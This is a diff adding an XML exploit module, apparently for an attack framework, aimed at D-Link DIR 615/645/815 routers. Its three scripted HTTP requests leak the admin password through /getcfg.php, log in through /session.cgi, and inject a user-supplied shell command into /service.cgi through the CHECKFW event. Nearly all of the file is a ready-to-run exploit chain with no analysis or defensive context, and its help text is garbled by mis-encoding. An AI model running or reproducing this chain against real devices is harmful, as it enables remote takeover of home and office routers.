@@ -1,0 +1,46 @@
+<bpf language=2.0>
+
+<parameter1>Command</parameter1>
+
+<steps>3</steps>
+   <step1>
+      <path>/getcfg.php</path>
+      <method>post</method>
+      <payload>SERVICES=DEVICE.ACCOUNT</payload>
+      <transfer><name>admin</name>
+				<usrid></usrid>
+				<password><tra></password></transfer>
+      <header>Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.4
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Host: localhost
+Cookie: uid=OwHZilJVQv</header>
+   </step1>
+   <step2>
+      <path>/session.cgi</path>
+      <method>post</method>
+      <payload>ACTION=login_plaintext&PASSWD=<tra/>&CAPTCHA=&USER=admin&REPORT_METHOD=xml</payload>
+      <header>Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.4
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Host: localhost
+Cookie: uid=OwHZilJVQv</header>
+   </step2>
+   <step3>
+      <path>/service.cgi</path>
+      <method>post</method>
+      <payload>EVENT=CHECKFW%26<par1/>%26</payload>
+      <header>Host: localhost
+User-Agent: Python-urllib/2.7
+Connection: keep-alive
+Cookie: uid=OwHZilJVQv
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8</header>
+   </step3>
+<help>
+Ó°Ïì¹Ì¼þ°æ±¾£º
+D-Link DIR 615/645/815
+</help>
